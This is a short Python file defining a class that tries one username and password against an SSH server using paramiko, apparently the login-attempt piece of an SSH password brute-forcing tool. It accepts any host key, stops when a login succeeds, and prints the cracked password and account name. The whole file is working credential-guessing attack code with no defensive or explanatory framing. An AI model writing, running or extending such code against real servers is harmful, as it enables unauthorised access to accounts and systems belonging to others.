import paramiko, termcolor


class ConnectSSH:
    def __init__(self, host, port_number, stop_flag):
        self.port_number = port_number
        self.host = host
        self.stop_flag = stop_flag

    def ssh_connect(self, password, username):
        ssh_conn = paramiko.SSHClient()
        ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh_conn.connect(self.host, port=self.port_number, username=username, password=password)
            self.stop_flag = 1
            print(termcolor.colored(('[+] Success Password: ' + password + ', For Account: ' + username), 'green'))
        except:
            print(termcolor.colored(('[-] Nop Login: ' + password), 'red'))
        ssh_conn.close()
